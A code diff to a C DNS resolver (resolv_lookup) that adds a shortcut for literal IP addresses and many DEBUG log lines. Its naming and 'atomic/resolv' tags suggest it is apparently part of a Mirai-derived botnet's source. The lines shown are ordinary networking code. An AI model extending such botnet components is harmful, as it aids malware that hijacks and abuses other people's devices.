@@ -18,6 +18,13 @@
 #include "rand.h"
 #include "protocol.h"
 
+// Check if string is a valid IP address
+static int is_valid_ip(const char *str)
+{
+    struct sockaddr_in sa;
+    return inet_pton(AF_INET, str, &(sa.sin_addr)) != 0;
+}
+
 void resolv_domain_to_hostname(char *dst_hostname, char *src_domain)
 {
     int len = util_strlen(src_domain) + 1;
@@ -67,6 +74,27 @@ static void resolv_skip_name(uint8_t *reader, uint8_t *buffer, int *count)
 struct resolv_entries *resolv_lookup(char *domain)
 {
     struct resolv_entries *entries = calloc(1, sizeof (struct resolv_entries));
+    
+    // Check if input is already an IP address
+    if (is_valid_ip(domain))
+    {
+#ifdef DEBUG
+        printf("(atomic/resolv) Input '%s' is already an IP address, skipping DNS lookup\n", domain);
+#endif
+        entries->addrs = malloc(sizeof(ipv4_t));
+        entries->addrs[0] = inet_addr(domain);
+        entries->addrs_len = 1;
+        
+#ifdef DEBUG
+        printf("(atomic/resolv) Resolved %s to 1 IPv4 address\n", domain);
+#endif
+        return entries;
+    }
+    
+#ifdef DEBUG
+    printf("(atomic/resolv) Performing DNS lookup for domain: %s\n", domain);
+#endif
+    
     char query[2048], response[2048];
     struct dnshdr *dnsh = (struct dnshdr *)query;
     char *qname = (char *)(dnsh + 1);
@@ -101,18 +129,27 @@ struct resolv_entries *resolv_lookup(char *domain)
             close(fd);
         if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
         {
+#ifdef DEBUG
+            printf("(atomic/resolv) Failed to create socket, errno=%d\n", errno);
+#endif
             sleep(1);
             continue;
         }
 
         if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
         {
+#ifdef DEBUG
+            printf("(atomic/resolv) Failed to connect to DNS server, errno=%d\n", errno);
+#endif
             sleep(1);
             continue;
         }
 
         if (send(fd, query, query_len, MSG_NOSIGNAL) == -1)
         {
+#ifdef DEBUG
+            printf("(atomic/resolv) Failed to send DNS query, errno=%d\n", errno);
+#endif
             sleep(1);
             continue;
         }
@@ -126,9 +163,19 @@ struct resolv_entries *resolv_lookup(char *domain)
         nfds = select(fd + 1, &fdset, NULL, NULL, &timeo);
 
         if (nfds == -1)
+        {
+#ifdef DEBUG
+            printf("(atomic/resolv) select() failed, errno=%d\n", errno);
+#endif
             break;
+        }
         else if (nfds == 0)
+        {
+#ifdef DEBUG
+            printf("(atomic/resolv) DNS query timeout (try %d/5)\n", tries);
+#endif
             continue;
+        }
         else if (FD_ISSET(fd, &fdset))
         {
             int ret = recvfrom(fd, response, sizeof (response), MSG_NOSIGNAL, NULL, NULL);
@@ -138,7 +185,12 @@ struct resolv_entries *resolv_lookup(char *domain)
             int stop;
 
             if (ret < (sizeof (struct dnshdr) + util_strlen(qname) + 1 + sizeof (struct dns_question)))
+            {
+#ifdef DEBUG
+                printf("(atomic/resolv) Received incomplete DNS response\n");
+#endif
                 continue;
+            }
 
             dnsh = (struct dnshdr *)response;
             qname = (char *)(dnsh + 1);
@@ -146,11 +198,24 @@ struct resolv_entries *resolv_lookup(char *domain)
             name = (char *)(dnst + 1);
 
             if (dnsh->id != dns_id)
+            {
+#ifdef DEBUG
+                printf("(atomic/resolv) DNS ID mismatch\n");
+#endif
                 continue;
+            }
             if (dnsh->ancount == 0)
+            {
+#ifdef DEBUG
+                printf("(atomic/resolv) No DNS answers received\n");
+#endif
                 continue;
+            }
 
             ancount = ntohs(dnsh->ancount);
+#ifdef DEBUG
+            printf("(atomic/resolv) Processing %d DNS answers\n", ancount);
+#endif
             while (ancount-- > 0)
             {
                 struct dns_resource *r_data = NULL;
@@ -174,6 +239,12 @@ struct resolv_entries *resolv_lookup(char *domain)
 
                         entries->addrs = realloc(entries->addrs, (entries->addrs_len + 1) * sizeof (ipv4_t));
                         entries->addrs[entries->addrs_len++] = (*p);
+                        
+#ifdef DEBUG
+                        struct in_addr addr_struct;
+                        addr_struct.s_addr = *p;
+                        printf("(atomic/resolv) Found IP: %s\n", inet_ntoa(addr_struct));
+#endif
                     }
 
                     name = name + ntohs(r_data->data_len);
